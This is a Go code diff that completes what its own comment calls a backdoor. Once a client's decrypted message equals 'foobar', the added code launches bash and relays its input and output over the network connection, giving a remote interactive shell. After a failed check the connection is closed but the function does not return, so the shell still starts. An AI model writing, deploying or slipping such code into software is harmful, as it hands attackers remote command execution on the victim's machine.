@@ -6,16 +6,45 @@ import (
 	"crypto/ecdh"
 	"crypto/rand"
 	"fmt"
+	"io"
 	"net"
 	"os"
+	"os/exec"
 )
 
-func sendThread() {
-
+func sendThread(stdout io.ReadCloser, conn net.Conn) {
+	buf := make([]byte, 1024)
+	for {
+		r, err := stdout.Read(buf)
+		if err != nil {
+			break
+		}
+		conn.Write(buf[:r])
+	}
 }
 
-func recvThread() {
+func recvThread(stdin io.WriteCloser, conn net.Conn) {
+	buf := make([]byte, 1024)
+	for {
+		r, err := conn.Read(buf)
+		if err != nil {
+			fmt.Println("Closing bash")
+			stdin.Write([]byte("exit\n"))
+			break
+		}
+		stdin.Write(buf[:r])
+	}
+}
 
+func errThread(stderr io.ReadCloser, conn net.Conn) {
+	buf := make([]byte, 1024)
+	for {
+		r, err := stderr.Read(buf)
+		if err != nil {
+			break
+		}
+		conn.Write(buf[:r])
+	}
 }
 
 // Handles initial connection from a client to this backdoor
@@ -62,13 +91,27 @@ func handleConnection(conn net.Conn) {
 	if err != nil {
 		conn.Close()
 	}
-
 	if string(pt) != "foobar" {
+		fmt.Println("Not foobar")
 		conn.Close()
 	}
 
-	// Start thread for listening and sending
+	// Ask the client for password
 
+	// Start the shell
+	fmt.Println("Starting bash")
+	bash := exec.Command("bash")
+	stdin, _ := bash.StdinPipe()
+	stdout, _ := bash.StdoutPipe()
+	stderr, _ := bash.StderrPipe()
+	bash.Start()
+
+	// Start thread for listening and sending
+	go sendThread(stdout, conn)
+	go errThread(stderr, conn)
+	go recvThread(stdin, conn)
+	bash.Wait()
+	fmt.Println("Finished")
 }
 
 const (
